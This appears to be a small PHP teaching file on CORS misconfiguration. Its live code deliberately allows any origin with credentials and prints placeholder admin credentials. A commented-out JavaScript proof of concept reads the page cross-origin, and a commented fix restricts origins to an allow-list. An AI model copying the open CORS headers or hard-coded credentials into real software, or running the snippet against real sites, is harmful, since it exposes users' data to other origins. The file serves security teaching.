<?php
// Exploit:
/*
 * <html>
 *   <head>
 *     <script type="text/javascript">
 *       function handleResponse() {
 *         document.write(this.responseText);
 *       }
 *
 *       function exploit() {
 *         var request = new XMLHttpRequest();
 *         request.addEventListener("load", handleResponse);
 *         request.open("GET", "http://localhost/vuln_cors.php");
 *         request.send();
 *       }
 *     </script>
 *   </head>
 *   <body>
 *     <script>exploit();</script>
 *   </body>
 * </html>
 */

// Fix:
/* Set allowed origin(s) to restrict CORS.
 * $allowed_origins = array(
 *     'https://trusted-domain.com',
 *     'http://localhost:8080' // Example of a trusted local development server
 * );
 *
 * Check if the request origin is in the list of allowed origins.
 * $request_origin = $_SERVER['HTTP_ORIGIN'] ?? '';
 * if (in_array($request_origin, $allowed_origins)) {
 *     header('Access-Control-Allow-Origin: ' . $request_origin);
 *     header('Access-Control-Allow-Credentials: true');
 * }
 */

header('Access-Control-Allow-Origin: *' );
header('Access-Control-Allow-Credentials: true');

echo "Username: admin" . PHP_EOL;
echo "Password: admin" . PHP_EOL;
?>
